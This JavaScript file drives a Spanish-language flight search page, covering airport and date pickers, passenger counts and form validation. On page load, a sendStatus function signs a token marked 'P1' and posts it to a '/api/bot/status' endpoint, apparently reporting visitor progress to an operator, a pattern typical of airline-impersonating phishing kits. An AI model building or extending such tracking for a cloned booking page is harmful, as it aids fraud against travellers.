const DOMElements = {
    btnSelectOrigin: document.querySelector('#select-origin'),
    modalSelectOrigin: document.querySelector('#modal-select-origin'),
    btnSelectDestination: document.querySelector('#select-destination'),
    modalSelectDestination: document.querySelector('#modal-select-destination'),
    btnSelectDate: document.querySelectorAll('#select-date'),
    modalSelectDate: document.querySelector('#modal-select-date'),
    btnEditPassengers: document.querySelector('#edit-passengers'),
    modalEditPassengers: document.querySelector('#modal-edit-passengers'),
    btnCloseModal: document.querySelectorAll('#close-modal'),
    contAirportOrigin: document.querySelector('#airport-list-origin'),
    contAirportDestination: document.querySelector('#airport-list-destination'),
    inputDates: document.querySelector('#datepicker'),
    roundTrip: document.querySelector('#roundTrip'),
    oneWay: document.querySelector('#oneWay'),
    inputSearchAirportOrigin: document.querySelector('#input-search-airport-origin'),
    inputSearchAirportDestination: document.querySelector('#input-search-airport-destination'),
    contPassengersOptions: document.querySelector('#passengers-options'),
    labelAdultsNumber: document.querySelector('#adults-number'),
    labelChildrenNumber: document.querySelector('#children-number'),
    labelBabiesNumber: document.querySelector('#babies-number'),
    labelDateGo: document.querySelector('#label-date-go'),
    labelDateBack: document.querySelector('#label-date-back'),
    btnSearchFlights: document.querySelector('#btn-search-flights'),
    loader: document.querySelector('.loader')
}


/**
 * Startup@Index
 * 
 */
document.addEventListener('DOMContentLoaded', ()=>{
    const datepicker = new HotelDatepicker(DOMElements.inputDates, {
        inline: true,
        showTopbar: false,
        onDayClick: function() {
            if(info.flightInfo.travel_type === 2){
                info.flightInfo.flightDates[0] = document.querySelector('.datepicker__month-day--first-day-selected').getAttribute('time');
                this.clearSelection();
                closeAllModals();
                updateLS();
                updateDOM();
            }
        },
        onSelectRange: function() {
            info.flightInfo.flightDates[0] = document.querySelector('.datepicker__month-day--first-day-selected').getAttribute('time');
            info.flightInfo.flightDates[1] = document.querySelector('.datepicker__month-day--last-day-selected').getAttribute('time');
            this.clearSelection();
            closeAllModals();
            updateLS();
            updateDOM();
        }
    });
    loadEventListeners();
    updateDOM();
    sendStatus();
});



/**
 * LoadEvents@Index
 * 
 */
const loadEventListeners = ()=>{

    DOMElements.contPassengersOptions.addEventListener('click', function(e) {
        const actionElement = e.target.closest('div[data-action]');

        if(actionElement.dataset.action){
            const action = actionElement.dataset.action;
            const passengersCategory = actionElement.dataset.category;
            const actualTotalCategory = info.flightInfo[passengersCategory];

            const { adults, children, babies } = info.flightInfo;
            let totalPassengers = adults + children + babies;
    
            if (action === 'add'){
                if(totalPassengers + 1 < 10){
                    info.flightInfo[passengersCategory]++;
                    updateLS();
                    updateDOM();
                }
            }else if (action === 'remove'){
                if(totalPassengers - 1 > 0 && actualTotalCategory - 1 >= 0){
                    info.flightInfo[passengersCategory]--;
                    updateLS();
                    updateDOM();
                }
            }
        }else{
            console.log('not dataset');
        }
    });

    DOMElements.inputSearchAirportOrigin.addEventListener('input', (e)=>{
        if(e.target.value === ''){
            listAirports(airports, DOMElements.contAirportOrigin, 'origin');
        }else{
            listAirports(searchAirport(e.target.value), DOMElements.contAirportOrigin, 'origin');
        }
    });

    DOMElements.inputSearchAirportDestination.addEventListener('input', (e)=>{
        if(e.target.value === ''){
            listAirports(airports, DOMElements.contAirportDestination, 'destination');
        }else{
            listAirports(searchAirport(e.target.value), DOMElements.contAirportDestination, 'destination');
        }
    });

    DOMElements.roundTrip.addEventListener('click', ()=>{
        info.flightInfo.travel_type = 1;
        updateLS();
        updateDOM();
    });

    DOMElements.oneWay.addEventListener('click', () =>{
        info.flightInfo.travel_type = 2;
        info.flightInfo.flightDates[1] = '';
        updateLS();
        updateDOM();
    });

    DOMElements.btnSearchFlights.addEventListener('click', ()=>{
        const validation = verifyAllFields();
        if(validation === true){
            setPassengersObjects();
            updateLS();

            DOMElements.loader.classList.add('show');
            setTimeout(()=>{
                window.location.href = 'select-flight-go.html';
            }, 1500);
        }else{
            alert(validation);
        }
    });


    DOMElements.btnSelectOrigin.addEventListener('click', ()=>{
        DOMElements.inputSearchAirportOrigin.value = '';
        listAirports(airports, DOMElements.contAirportOrigin, 'origin');
        showModal(DOMElements.modalSelectOrigin);
    });

    DOMElements.btnSelectDestination.addEventListener('click', ()=>{
        DOMElements.inputSearchAirportDestination.value = '';
        listAirports(airports, DOMElements.contAirportDestination, 'destination');
        showModal(DOMElements.modalSelectDestination);
    });

    DOMElements.btnSelectDate.forEach(btn => {
        btn.addEventListener('click', ()=>{
            showModal(DOMElements.modalSelectDate);
        });
    });

    DOMElements.btnEditPassengers.addEventListener('click', ()=>{
        showModal(DOMElements.modalEditPassengers);
    });

    DOMElements.btnCloseModal.forEach(btn =>{
        btn.addEventListener('click', ()=>{
            const modalId = btn.getAttribute('data-target-modal');
            closeModal(document.querySelector(modalId));
        });
    });
}

const updateDOM = ()=>{

    const {travel_type, seat_type, origin, destination, adults, children, babies, flightDates} = info.flightInfo;

    //Travel Type
    if(travel_type === 1){
        DOMElements.roundTrip.checked = true;
    }else if(travel_type === 2){
        DOMElements.oneWay.checked = true;
    }else{
        console.log('INVALID_DATE_FORMAT');
    }

    //Departures
    if(origin !== ''){
        DOMElements.btnSelectOrigin.textContent = `${origin.city} (${origin.code})`;
        DOMElements.btnSelectOrigin.classList.add('tc-blue');
    }else{
        console.log('NOT_ORIGIN_AIRPORT');
    }

    if(destination !== ''){
        DOMElements.btnSelectDestination.textContent = `${destination.city} (${destination.code})`;
        DOMElements.btnSelectDestination.classList.add('tc-blue');
    }else{
        console.log('NOT_DESTINATION_AIRPORT');
    }

    //Dates
    if(travel_type === 1){
        if(flightDates[0] != 0){
            let departure1 = new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES');
            DOMElements.labelDateGo.textContent = departure1;
            if(flightDates[1] != 0){
                let departure2 = new Date(parseInt(flightDates[1])).toLocaleDateString('es-ES');
                DOMElements.labelDateBack.textContent = departure2;
            }else{
                DOMElements.labelDateBack.textContent = 'SELECCIONAR';
                console.log('DEP_DATE_2_NULL');
            }
        }else{
            DOMElements.labelDateGo.textContent = 'SELECCIONAR';
            console.log('DEP_DATE_1_NULL');
            DOMElements.labelDateBack.textContent = 'SELECCIONAR';
            console.log('DEP_DATE_2_NULL');
        }
    }else if(travel_type === 2){
        if(flightDates[0] !== 0){
            let departure1 = new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES');
            DOMElements.labelDateGo.textContent = departure1;
            DOMElements.labelDateBack.textContent = 'Sólo ida';
        }else{
            DOMElements.labelDateGo.textContent = 'SELECCIONAR';
            DOMElements.labelDateBack.textContent = 'Sólo ida';
        }
    }else{
        console.log('NO_TRAVEL_TYPE');
    }

    //Passengers
    DOMElements.labelAdultsNumber.textContent = adults;
    DOMElements.labelChildrenNumber.textContent = children;
    DOMElements.labelBabiesNumber.textContent = babies;

    DOMElements.btnEditPassengers.value = '';
    if(info.flightInfo.adults !== 0){
        DOMElements.btnEditPassengers.value += `${adults} ${adults > 1 ? 'Adultos' : 'Adulto'}`;
    }
    if(info.flightInfo.children !== 0){
        DOMElements.btnEditPassengers.value += `, ${children} ${children > 1 ? 'Niños' : 'Niño'}`;
    }
    if(info.flightInfo.babies !== 0){
        DOMElements.btnEditPassengers.value += `, ${babies} ${babies > 1 ? 'Bebés' : 'Bebé'}`;
    }

}


/**
 * Functions@Index
 * 
 */
const listAirports = (airports, container, type)=>{
    setTimeout(function(){
        container.innerHTML = '';
        airports.forEach(airport =>{
            const airportDiv = document.createElement('div');
            airportDiv.className = "pl-5 pr-1 pt-1 pb-1 ml-1 d-flex justify-space-between align-items-center";
            
            airportDiv.addEventListener('click', () => {
                selectAirport(airport, type);
                closeAllModals();
    
                /** Manage Autodirection */
                if(type === 'origin'){
                    if(info.flightInfo.destination === ''){
                        DOMElements.btnSelectDestination.click();
                    }
                }else if(type === 'destination'){
                    if(info.flightInfo.flightDates[0] === 0){
                        DOMElements.btnSelectDate[0].click();
                    }
                }
                
            });
            
            const airportInfo = document.createElement('p');
            airportInfo.className = "tc-blue m-0";
            airportInfo.textContent = `${airport.city} (${airport.code})`;
            
            const newTag = document.createElement('span');
            newTag.className = "red-tag";
            newTag.textContent = "Nuevo";
    
            airportDiv.appendChild(airportInfo);
            airportDiv.appendChild(newTag);
    
            container.appendChild(airportDiv);
        }); 
    }, 200);
}

const searchAirport = (input)=>{
    let search = [];
    search = airports.filter(destination => {return (destination.country.toLowerCase().includes(input.toLowerCase()) || destination.city.toLowerCase().includes(input.toLowerCase()) || destination.code.toLowerCase().includes(input.toLowerCase()))});
    return search;
}

const selectAirport = (airport, type) =>{
    info.flightInfo[type] = airport;
    updateLS();
    updateDOM();
}

const showModal = (modal) =>{
    modal.classList.add('show');
}

const closeModal = (modal) =>{
    modal.classList.remove('show');
}

const closeAllModals = () =>{
    try{
        DOMElements.modalEditPassengers.classList.remove('show');
        DOMElements.modalSelectDate.classList.remove('show');
        DOMElements.modalSelectDestination.classList.remove('show');
        DOMElements.modalSelectOrigin.classList.remove('show');
    }catch(err){
        console.log(err);
    }
}

const sendStatus = () =>{
    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P1'}, JWT_SIGN);

    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({token: tokenn})
        });
    }catch(err){
        console.log(err);
    }
}

const setPassengersObjects = ()=>{
    if(info.flightInfo.adults > 0){
        info.passengersInfo.adults = [];
        for(let i = 0; i < info.flightInfo.adults; i++){
            info.passengersInfo.adults.push({
                name: '',
                surname: '',
                cc: ''
            });
        }
    }

    if(info.flightInfo.children > 0){
        info.passengersInfo.children = [];
        for(let i = 0; i < info.flightInfo.children; i++){
            info.passengersInfo.children.push({
                name: '',
                surname: '',
                cc: ''
            });
        }
    }

    if(info.flightInfo.babies){
        info.passengersInfo.babies = [];
        for(let i = 0; i < info.flightInfo.babies; i++){
            info.passengersInfo.babies.push({
                name: '',
                surname: '',
                cc: ''
            });
        }
    }
}

const verifyAllFields = ()=>{
    const {travel_type, seat_type, origin, destination, adults, children, babies, flightDates} = info.flightInfo;

    if(origin.city !== undefined){
        if(destination.city !== undefined){
            if(travel_type === 1){
                if(flightDates[0] !== ''){
                    if(flightDates[1] !== ''){
                        return  true;
                    }else{
                        return 'SELECCIONE UNA FECHA DE VUELTA'
                    }
                }else{
                    return 'SELECCIONE UNA FECHA DE IDA';
                }
            }else if(travel_type === 2){
                if(flightDates[0] !== 0){
                    return true;
                }else{
                    return 'SELECCIONE UNA FECHA DE IDA';
                }
            }else{
                return 'SELECCIONE UN TIPO DE VIAJE';
            }
        }else{
            return 'SELECCIONE UN AEROPUERTO DE LLEGADA'
        }
    }else{
        return 'SELECCIONE UN AEROPUERTO DE SALIDA'
    }
    
}

